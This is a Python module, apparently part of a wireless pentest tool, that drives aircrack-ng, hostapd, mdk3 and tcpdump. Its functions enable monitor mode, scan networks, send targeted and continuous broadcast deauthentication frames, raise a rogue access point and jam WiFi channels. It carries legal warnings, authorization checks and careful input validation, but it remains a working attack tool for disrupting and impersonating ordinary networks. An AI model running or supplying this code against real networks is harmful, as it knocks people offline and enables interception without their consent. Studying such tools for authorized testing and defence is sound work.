"""
WiFi Deauthentication Module
Advanced WiFi security testing and device disconnection functionality.
WARNING: Only use on networks you own or have explicit permission to test.
"""

import atexit
import logging
import os
import platform
import re
import secrets
import shutil
import subprocess
import tempfile
import time
from dataclasses import dataclass
from typing import Dict, List

try:
    from .scope import require_authorized, require_scope_configured
except ImportError:  # module executed as a top-level script
    from scope import require_authorized, require_scope_configured


# Kernel interface names (IFNAMSIZ is 16 bytes including the NUL, and
# tools add suffixes like "mon"): an alphanumeric first character plus
# alphanumerics / "." / "_" / "-", capped at 32. Anything outside this
# shape — above all a LEADING "-" — placed in the positional interface
# slot of a tool's argv is parsed by that tool as another OPTION, not
# as an interface (option injection into a sudo'd process). jam_channel
# already validates its channel for exactly this reason; the interface
# argument reaches the same argv vectors and gets the same treatment.
_INTERFACE_RE = re.compile(r"[A-Za-z0-9][A-Za-z0-9._-]{0,31}")
_MAC_RE = re.compile(r"[0-9A-Fa-f]{2}([:-][0-9A-Fa-f]{2}){5}")


def _valid_interface(interface) -> bool:
    """True if ``interface`` is shaped like a real interface name."""
    return isinstance(interface, str) and bool(_INTERFACE_RE.fullmatch(interface))


def _valid_mac(mac) -> bool:
    """True if ``mac`` is a colon/dash-separated 48-bit MAC address."""
    return isinstance(mac, str) and bool(_MAC_RE.fullmatch(mac))


@dataclass
class DeauthTarget:
    """Represents a target for deauthentication."""

    mac_address: str
    gateway_mac: str
    ssid: str
    channel: int
    interface: str
    packet_count: int = 64


class WiFiDeauthenticator:
    """
    WiFi deauthentication engine for testing network security.
    Implements IEEE 802.11 deauthentication frame injection.

    WARNING: Unauthorized deauthentication attacks are illegal.
    Only use this for authorized security testing on your own networks.
    """

    def __init__(self, logger: logging.Logger = None):
        """
        Initialize WiFi deauthenticator.

        Args:
            logger: Logger instance
        """
        self.logger = logger or logging.getLogger(__name__)
        self.system = platform.system().lower()
        self._validate_environment()

    def _validate_environment(self):
        """Validate system requirements for deauth operations."""
        if self.system not in ["linux", "darwin"]:
            self.logger.warning(
                "Deauthentication testing is primarily supported on Linux/macOS"
            )

        # Check for required tools
        self._check_airmon_ng()
        self._check_aireplay_ng()

    def _check_airmon_ng(self) -> bool:
        """Check if airmon-ng is installed."""
        # shutil.which is cross-platform; shelling out to the Unix-only
        # "which" binary would raise FileNotFoundError on Windows.
        try:
            return shutil.which("airmon-ng") is not None
        except Exception as e:
            self.logger.warning(f"airmon-ng not found: {e}")
            return False

    def _check_aireplay_ng(self) -> bool:
        """Check if aireplay-ng is installed."""
        try:
            return shutil.which("aireplay-ng") is not None
        except Exception as e:
            self.logger.warning(f"aireplay-ng not found: {e}")
            return False

    def enable_monitor_mode(self, interface: str) -> bool:
        """
        Enable monitor mode on wireless interface.

        Args:
            interface: Wireless interface name (e.g., 'wlan0')

        Returns:
            True if successful, False otherwise
        """
        if self.system != "linux":
            self.logger.error("Monitor mode setup is only supported on Linux")
            return False

        if not _valid_interface(interface):
            self.logger.error(f"Invalid interface name: {interface!r}")
            return False

        try:
            # Both airmon-ng calls carry the `timeout` orphan backstop
            # used by every other sudo'd tool path in this module: the
            # run-level timeout alone kills only the sudo parent, and a
            # wedged airmon-ng (a shell script with children of its own)
            # would be orphaned. The wrapper's 8s sits inside the
            # run-level 10s budget, mirroring the other paths.
            # Kill interfering processes
            subprocess.run(
                ["sudo", "timeout", "8", "airmon-ng", "check", "kill"],
                capture_output=True,
                timeout=10,
            )

            # Enable monitor mode
            result = subprocess.run(
                ["sudo", "timeout", "8", "airmon-ng", "start", interface],
                capture_output=True,
                text=True,
                timeout=10,
            )

            if result.returncode == 0:
                self.logger.info(f"Monitor mode enabled on {interface}")
                return True
            else:
                self.logger.error(f"Failed to enable monitor mode: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            self.logger.error("Monitor mode setup timed out")
            return False
        except Exception as e:
            self.logger.error(f"Error enabling monitor mode: {e}")
            return False

    def disable_monitor_mode(self, interface: str) -> bool:
        """
        Disable monitor mode on wireless interface.

        Args:
            interface: Monitor interface name

        Returns:
            True if successful, False otherwise
        """
        if self.system != "linux":
            return False

        if not _valid_interface(interface):
            self.logger.error(f"Invalid interface name: {interface!r}")
            return False

        try:
            # Disable monitor mode. The airmon-ng call carries the same
            # `timeout` orphan backstop as every other sudo'd tool path
            # in this module (see enable_monitor_mode).
            result = subprocess.run(
                ["sudo", "timeout", "8", "airmon-ng", "stop", interface],
                capture_output=True,
                text=True,
                timeout=10,
            )

            # Restart networking (best effort). Deliberately NOT
            # timeout-wrapped: systemctl is a client asking systemd to
            # perform the restart — there is no orphanable payload, the
            # run-level timeout bounds the client, and a wrapper firing
            # mid-restart could leave networking half-restarted.
            subprocess.run(
                ["sudo", "systemctl", "restart", "networking"],
                capture_output=True,
                timeout=10,
            )

            if result.returncode != 0:
                # Previously the stop result was discarded and success
                # was reported unconditionally — a failed stop left the
                # interface in monitor mode while claiming otherwise.
                self.logger.error(
                    f"Failed to disable monitor mode on {interface}: "
                    f"{result.stderr}"
                )
                return False

            self.logger.info(f"Monitor mode disabled on {interface}")
            return True

        except Exception as e:
            self.logger.error(f"Error disabling monitor mode: {e}")
            return False

    def get_wireless_interfaces(self) -> List[str]:
        """
        Get list of wireless interfaces.

        Returns:
            List of wireless interface names
        """
        interfaces = []

        if self.system == "linux":
            try:
                result = subprocess.run(
                    ["iwconfig"], capture_output=True, text=True, timeout=5
                )

                # Parse iwconfig output
                for line in result.stdout.split("\n"):
                    if "IEEE 802.11" in line:
                        interface = line.split()[0]
                        interfaces.append(interface)

            except Exception as e:
                self.logger.debug(f"Error getting wireless interfaces: {e}")

        return interfaces

    def scan_nearby_networks(self, interface: str, duration: int = 10) -> List[Dict]:
        """
        Scan for nearby WiFi networks.

        Args:
            interface: Monitor mode interface
            duration: Scan duration in seconds

        Returns:
            List of nearby networks with details (bssid, ssid, channel,
            privacy, power). Empty if airodump-ng is missing or finds
            nothing.
        """
        if self.system != "linux":
            self.logger.error("WiFi scanning is only supported on Linux")
            return []

        if not _valid_interface(interface):
            self.logger.error(f"Invalid interface name: {interface!r}")
            return []

        try:
            duration = max(1, int(duration))
        except (TypeError, ValueError):
            duration = 10

        # Capture files go into a private temp dir -- never a predictable
        # /tmp path. airodump-ng appends its own suffixes to the prefix.
        scan_dir = tempfile.mkdtemp(prefix="shibacuddles_scan_")
        scan_prefix = os.path.join(scan_dir, "scan")
        try:
            try:
                # airodump-ng runs until killed; the timeout ending it is
                # the normal path, not an error. Its chatty stdout goes to
                # DEVNULL -- it would otherwise accumulate in memory for
                # the whole scan; the networks come from the CSV files.
                #
                # ORPHAN BACKSTOP (same pattern as jam_channel): the
                # `timeout` wrapper, not subprocess.run's kill, is what
                # guarantees airodump-ng dies. subprocess.run's timeout
                # kills only the `sudo` parent; the airodump-ng child
                # would be orphaned and keep capturing (holding the
                # monitor interface) indefinitely. The wrapper survives
                # as an orphan itself but still fires on schedule.
                subprocess.run(
                    [
                        "sudo",
                        "timeout",
                        str(duration + 5),
                        "airodump-ng",
                        "-w",
                        scan_prefix,
                        "-o",
                        "csv",
                        "--write-interval",
                        str(duration),
                        interface,
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=duration + 15,
                )
            except subprocess.TimeoutExpired:
                pass  # backstop of the backstop: wrapper should have fired

            networks = self._parse_airodump_csv(scan_dir)
            self.logger.info(f"WiFi scan complete: {len(networks)} networks")
            return networks
        except Exception as e:
            self.logger.error(f"Error scanning networks: {e}")
            return []
        finally:
            shutil.rmtree(scan_dir, ignore_errors=True)

    @staticmethod
    def _parse_airodump_csv(scan_dir: str) -> List[Dict]:
        """Parse airodump-ng CSV capture files into network dicts.

        Reads the access-point section (everything before the
        "Station MAC" line). Best effort: ESSIDs containing commas shift
        columns, so the SSID is rebuilt from the trailing fields.
        """
        networks = []
        try:
            names = sorted(os.listdir(scan_dir))
        except OSError:
            return networks
        for name in names:
            if not name.endswith(".csv"):
                continue
            path = os.path.join(scan_dir, name)
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                    for line in fh:
                        line = line.strip()
                        if not line:
                            continue
                        if line.startswith("Station MAC"):
                            break  # end of the access-point section
                        if line.startswith("BSSID"):
                            continue  # header row
                        parts = [p.strip() for p in line.split(",")]
                        if len(parts) < 14 or not parts[0]:
                            continue
                        # Rebuild the SSID from the trailing fields: an
                        # ESSID containing commas shifts the columns. Join
                        # the unstripped tail so spaces inside the SSID
                        # survive (stripping first would turn
                        # "Cafe, Free, WiFi" into "Cafe,Free,WiFi").
                        ssid = ",".join(line.split(",")[13:]).rstrip(",").strip()
                        networks.append(
                            {
                                "bssid": parts[0],
                                "channel": parts[3],
                                "privacy": parts[5],
                                "power": parts[8],
                                "ssid": ssid,
                            }
                        )
            except OSError:
                continue
        return networks

    def deauthenticate_device(self, target: DeauthTarget) -> bool:
        """
        Send deauthentication frames to target device.

        Args:
            target: DeauthTarget with device information

        Returns:
            True if deauthentication sent successfully
        """
        require_authorized(
            ssid=target.ssid, bssid=target.gateway_mac, action="deauthenticate_device"
        )
        if self.system != "linux":
            self.logger.error("Deauthentication is only supported on Linux")
            return False

        # Validate everything that reaches the aireplay-ng argv before
        # spawning a sudo'd process with it: malformed MACs are refused
        # outright, and an interface outside the interface-name shape
        # would be parsed as an aireplay-ng option (option injection).
        if not _valid_mac(target.gateway_mac) or not _valid_mac(target.mac_address):
            self.logger.error(
                f"Invalid MAC address: gateway={target.gateway_mac!r}, "
                f"device={target.mac_address!r}"
            )
            return False
        if not _valid_interface(target.interface):
            self.logger.error(f"Invalid interface name: {target.interface!r}")
            return False

        self.logger.warning(
            f"LEGAL WARNING: Deauthenticating {target.mac_address} on {target.ssid}. "
            f"Ensure you have permission to perform this action."
        )

        try:
            # Clamp the frame count to a positive int. aireplay-ng treats
            # "--deauth 0" as *continuous* mode, so a zero/negative count
            # would silently change the attack's behavior.
            try:
                packet_count = int(target.packet_count)
            except (TypeError, ValueError):
                packet_count = 64
            packet_count = max(1, packet_count)

            # Send deauth frames using aireplay-ng. The `timeout`
            # wrapper is the orphan backstop (see scan_nearby_networks):
            # a finite frame count should finish in seconds, but a
            # wedged driver can hang aireplay-ng forever, and
            # subprocess.run's timeout would only kill the sudo parent.
            result = subprocess.run(
                [
                    "sudo",
                    "timeout",
                    "25",
                    "aireplay-ng",
                    "--deauth",
                    str(packet_count),
                    "-a",
                    target.gateway_mac,
                    "-c",
                    target.mac_address,
                    target.interface,
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )

            if result.returncode == 0:
                self.logger.info(
                    f"Deauthentication sent to {target.mac_address} "
                    f"({packet_count} frames)"
                )
                return True
            else:
                self.logger.error(f"Deauthentication failed: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            self.logger.error("Deauthentication timed out")
            return False
        except Exception as e:
            self.logger.error(f"Error during deauthentication: {e}")
            return False

    def deauthenticate_all_devices(
        self, gateway_mac: str, ssid: str, interface: str, duration: int = 30
    ) -> int:
        """
        Deauthenticate all connected devices from a network.

        Args:
            gateway_mac: MAC address of gateway/AP
            ssid: Network SSID
            interface: Monitor mode interface
            duration: How long to send deauth frames (seconds)

        Returns:
            0 always; the underlying aireplay-ng process runs in continuous
            deauth mode ("--deauth 0") so no per-frame count is available.
            (A return of 0 does NOT mean "0 frames sent".)
        """
        require_authorized(
            ssid=ssid, bssid=gateway_mac, action="deauthenticate_all_devices"
        )
        if self.system != "linux":
            self.logger.error("Broadcast deauthentication is only supported on Linux")
            return 0

        # Coerce and floor the duration BEFORE it reaches any timeout
        # arithmetic (mirrors jam_channel): "--deauth 0" below is
        # aireplay-ng's CONTINUOUS mode, so the timeout wrapper is the
        # only thing that ever stops it — and `timeout 0` would DISABLE
        # that wrapper, while subprocess.run(timeout<=0) expires
        # instantly and kills only the sudo parent, orphaning an
        # infinite broadcast deauth.
        try:
            duration = int(duration)
        except (TypeError, ValueError):
            self.logger.error(
                f"deauthenticate_all_devices: duration must be an integer, "
                f"got {duration!r}"
            )
            return 0
        if duration < 1:
            self.logger.error(
                f"deauthenticate_all_devices: duration must be at least "
                f"1 second, got {duration}"
            )
            return 0
        # Same argv validation as deauthenticate_device (see there).
        if not _valid_mac(gateway_mac):
            self.logger.error(f"Invalid MAC address: gateway={gateway_mac!r}")
            return 0
        if not _valid_interface(interface):
            self.logger.error(f"Invalid interface name: {interface!r}")
            return 0

        self.logger.warning(
            f"LEGAL WARNING: Broadcasting deauthentication frames to all "
            f"devices on {ssid}. Ensure you have permission."
        )

        try:
            # Broadcast deauth to all clients. The `timeout` wrapper is
            # the orphan backstop (see scan_nearby_networks): it, not
            # subprocess.run's kill of the sudo parent, is what stops
            # the continuous "--deauth 0" stream after `duration`.
            result = subprocess.run(
                [
                    "sudo",
                    "timeout",
                    str(duration),
                    "aireplay-ng",
                    "--deauth",
                    "0",
                    "-a",
                    gateway_mac,
                    interface,
                ],
                capture_output=True,
                text=True,
                timeout=duration + 10,
            )

            # The return contract is "0 always", but the LOG must not
            # claim completion when aireplay-ng failed outright (bad
            # interface, driver refusal): previously the result was
            # discarded and success was logged unconditionally. Exit
            # 124 is the wrapper ending the continuous stream after the
            # full window — that, and 0, are the success shapes.
            if result.returncode in (0, 124):
                self.logger.info(f"Broadcast deauthentication completed on {ssid}")
            else:
                self.logger.error(
                    f"Broadcast deauthentication on {ssid} failed: "
                    f"aireplay-ng exited {result.returncode}"
                    + (f": {result.stderr.strip()}" if result.stderr else "")
                )
            return 0  # 0 means continuous until stopped

        except subprocess.TimeoutExpired:
            self.logger.info(f"Broadcast deauthentication ran for {duration}s")
            return 0
        except Exception as e:
            self.logger.error(f"Error during broadcast deauth: {e}")
            return 0

    def create_rogue_ap(self, interface: str, ssid: str, channel: int = 6) -> bool:
        """
        Create a rogue access point for testing.

        Args:
            interface: Monitor mode interface
            ssid: SSID for rogue AP
            channel: WiFi channel

        Returns:
            True if successful
        """
        require_authorized(ssid=ssid, action="create_rogue_ap")
        if self.system != "linux":
            self.logger.error("Rogue AP creation is only supported on Linux")
            return False

        if not _valid_interface(interface):
            self.logger.error(f"Invalid interface name: {interface!r}")
            return False

        self.logger.warning(f"Creating rogue AP: {ssid}")

        try:
            # Use hostapd to create AP.
            # A fresh random WPA passphrase is generated on every run --
            # credentials must never be hardcoded.
            passphrase = secrets.token_urlsafe(16)
            print(f"[+] Rogue AP WPA passphrase (generated, shown once): {passphrase}")
            config = self._generate_hostapd_config(interface, ssid, channel, passphrase)

            # Write the config to a private temp file (never a predictable
            # /tmp path) and always delete it afterwards.
            fd, hostapd_conf = tempfile.mkstemp(
                prefix="shibacuddles_hostapd_", suffix=".conf"
            )
            os.close(fd)
            try:
                with open(hostapd_conf, "w") as f:
                    f.write(config)

                # atexit backstop: if the interpreter exits while hostapd
                # is running, the config (which holds a live WPA
                # passphrase) is still removed.
                atexit_handle = atexit.register(_silent_unlink, hostapd_conf)
                try:
                    try:
                        # `timeout` wrapper = orphan backstop (see
                        # scan_nearby_networks): without it, the
                        # subprocess.run timeout kills only the sudo
                        # parent and the rogue AP keeps broadcasting
                        # with the generated passphrase indefinitely.
                        result = subprocess.run(
                            ["sudo", "timeout", "60", "hostapd", hostapd_conf],
                            capture_output=True,
                            timeout=75,
                        )
                    except subprocess.TimeoutExpired:
                        # hostapd runs in the foreground, so the timeout
                        # firing is the normal end of the window -- it
                        # means the AP stayed up for the full 60 seconds.
                        self.logger.info(
                            f"Rogue AP '{ssid}' ran for the full 60s window"
                        )
                        return True
                    # 124 is the timeout wrapper's exit code: hostapd
                    # stayed up for the full 60s window and the wrapper
                    # ended it — the same success case as the
                    # TimeoutExpired branch above.
                    return result.returncode in (0, 124)
                finally:
                    atexit.unregister(atexit_handle)
            finally:
                _silent_unlink(hostapd_conf)

        except Exception as e:
            self.logger.error(f"Error creating rogue AP: {e}")
            return False

    def _generate_hostapd_config(
        self, interface: str, ssid: str, channel: int, passphrase: str
    ) -> str:
        """
        Generate hostapd configuration.

        Args:
            interface: Network interface
            ssid: SSID name
            channel: WiFi channel
            passphrase: WPA2 passphrase

        Returns:
            Configuration string

        Raises:
            ValueError: If any value could break out of its config line
                (CR/LF injection) or the channel is not a valid integer.
        """
        interface = _require_single_line(interface, "interface")
        if not _valid_interface(interface):
            raise ValueError(f"invalid interface name: {interface!r}")
        ssid = _require_single_line(ssid, "ssid")
        try:
            channel = int(channel)
        except (TypeError, ValueError):
            raise ValueError(f"channel must be an integer, got {channel!r}")
        if not 1 <= channel <= 196:
            raise ValueError(f"channel out of WiFi range: {channel}")
        return f"""
interface={interface}
ssid={ssid}
channel={channel}
driver=nl80211
wpa=2
wpa_passphrase={passphrase}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
"""


def _silent_unlink(path: str) -> None:
    """Best-effort file removal; never raises."""
    try:
        os.unlink(path)
    except OSError:
        pass


def _require_single_line(value: str, name: str) -> str:
    """Reject CR/LF in a hostapd.conf value.

    A newline inside ``interface`` or ``ssid`` would inject extra hostapd
    directives into the generated config file. SSIDs can legally contain
    newline bytes (up to 32 arbitrary octets), so this raises instead of
    stripping: stripping would silently change the SSID under test.
    """
    text = str(value)
    if "\r" in text or "\n" in text:
        raise ValueError(f"{name} must not contain CR or LF characters")
    return text


class NetworkInterruptor:
    """
    Advanced network interruption and interference testing.
    """

    def __init__(self, logger: logging.Logger = None):
        """Initialize network interruptor."""
        self.logger = logger or logging.getLogger(__name__)

    def jam_channel(self, interface: str, channel: int, duration: int = 10) -> bool:
        """
        Perform WiFi channel jamming for security testing.

        Args:
            interface: Monitor interface
            channel: Channel to jam
            duration: Duration in seconds

        Returns:
            True if jamming started
        """
        require_scope_configured(action="jam_channel")
        # Validate before building the mdk3 command line, mirroring
        # _generate_hostapd_config: the channel reaches the subprocess
        # argv verbatim, so a non-integer or out-of-range value (e.g. a
        # string starting with "-") could be parsed as an mdk3 option
        # instead of a channel. Duration feeds both the `timeout`
        # wrapper and time.sleep, so coerce it once here too.
        try:
            channel = int(channel)
            duration = int(duration)
        except (TypeError, ValueError):
            self.logger.error(
                f"jam_channel: channel and duration must be integers, "
                f"got channel={channel!r}, duration={duration!r}"
            )
            return False
        if not 1 <= channel <= 196:
            self.logger.error(f"jam_channel: channel out of WiFi range: {channel}")
            return False
        if duration < 1:
            # A non-positive duration is not a no-op: the backstop
            # wrapper is invoked as `timeout <duration + 5>`, and
            # `timeout 0` DISABLES the backstop entirely, while the
            # negative sleep afterwards raises only after mdk3 has
            # already been spawned. Refuse before spawning anything.
            self.logger.error(
                f"jam_channel: duration must be at least 1 second, "
                f"got {duration}"
            )
            return False
        if not _valid_interface(interface):
            # The interface sits in mdk3's positional interface slot;
            # a value outside the interface-name shape (e.g. "-h")
            # would be parsed as an mdk3 option. The channel got this
            # validation in an earlier sweep; the interface did not.
            self.logger.error(f"jam_channel: invalid interface name: {interface!r}")
            return False
        self.logger.warning(f"Jamming channel {channel} for {duration} seconds")
        self.logger.warning(
            "This is a network disruption attack - use only for authorized testing"
        )

        proc = None
        try:
            # Use mdk3 for WiFi jamming; keep the handle so the jammer is
            # always terminated instead of being orphaned after we return.
            # The `timeout` wrapper is a backstop: if this process is
            # SIGKILLed before the finally block runs, the root mdk3 still
            # self-terminates instead of jamming the channel forever.
            proc = subprocess.Popen(
                [
                    "sudo",
                    "timeout",
                    str(duration + 5),
                    "mdk3",
                    interface,
                    "b",
                    "-c",
                    str(channel),
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # Verify the jammer actually started: a dead process at t=0
            # (bad interface, mdk3 missing, driver refusal) means no
            # jamming is happening even though the command "ran".
            time.sleep(0.2)
            if proc.poll() is not None:
                self.logger.error(
                    f"mdk3 exited immediately (rc={proc.returncode}); "
                    "jamming never started"
                )
                return False

            time.sleep(duration)
            if proc.poll() is not None:
                # Started, then died mid-window (driver reset, interface
                # dropped): reporting True would claim a full-duration
                # jam that did not happen.
                self.logger.error(
                    f"mdk3 exited early (rc={proc.returncode}); "
                    "jamming did not run for the full window"
                )
                return False
            return True

        except Exception as e:
            self.logger.error(f"Error jamming channel: {e}")
            return False
        finally:
            if proc is not None and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except Exception:
                    proc.kill()

    def analyze_traffic_patterns(self, interface: str, duration: int = 30) -> Dict:
        """
        Analyze network traffic patterns.

        Args:
            interface: Interface to sniff
            duration: Capture duration in seconds

        Returns:
            Dictionary with capture metadata. NOTE: packet-level analysis
            is not implemented yet -- protocol breakdowns are empty and
            total_packets is 0. The capture itself runs; only the parsing
            is a stub.
        """
        # Coerce and floor the duration first (mirrors jam_channel):
        # it feeds the `timeout` wrapper below, where 0 would DISABLE
        # the backstop entirely.
        try:
            duration = int(duration)
        except (TypeError, ValueError):
            self.logger.error(
                f"analyze_traffic_patterns: duration must be an integer, "
                f"got {duration!r}"
            )
            return {}
        if duration < 1:
            self.logger.error(
                f"analyze_traffic_patterns: duration must be at least "
                f"1 second, got {duration}"
            )
            return {}
        if not _valid_interface(interface):
            self.logger.error(
                f"analyze_traffic_patterns: invalid interface name: {interface!r}"
            )
            return {}

        # Private temp file, never a predictable /tmp path: tcpdump runs
        # under sudo, and a pre-planted symlink at a fixed path would let
        # another user redirect the capture output.
        fd, pcap_path = tempfile.mkstemp(prefix="shibacuddles_traffic_", suffix=".pcap")
        os.close(fd)
        try:
            # Use tcpdump to capture traffic. `-c 1000` is an upper bound,
            # not a promise: on a quiet network tcpdump never reaches it
            # before the timeout ends the capture.
            #
            # Orphan backstop (see scan_nearby_networks): on Linux the
            # `timeout` wrapper guarantees tcpdump dies at the end of
            # the window even if this process is killed first — the
            # subprocess.run timeout alone only kills the sudo parent.
            # (GNU timeout is not part of stock macOS, so the wrapper is
            # Linux-only; macOS keeps the run-timeout behaviour.)
            cmd = ["sudo"]
            if platform.system().lower() == "linux":
                cmd += ["timeout", str(duration)]
            cmd += ["tcpdump", "-i", interface, "-c", "1000", "-w", pcap_path]
            try:
                subprocess.run(
                    cmd,
                    capture_output=True,
                    timeout=duration + 10,
                )
            except subprocess.TimeoutExpired:
                # Expected on quiet networks: the capture window closed
                # before 1000 packets arrived. The partial capture on
                # disk is still usable for stats below.
                self.logger.info(
                    f"Traffic capture window ({duration}s) ended before "
                    "1000 packets arrived; using partial capture"
                )

            # Packet parsing not implemented yet (see docstring).
            stats = {
                "total_packets": 0,
                "protocols": {},
                "top_ips": [],
                "duration": duration,
            }

            return stats

        except Exception as e:
            self.logger.error(f"Error analyzing traffic: {e}")
            return {}
        finally:
            try:
                os.unlink(pcap_path)
            except OSError:
                pass
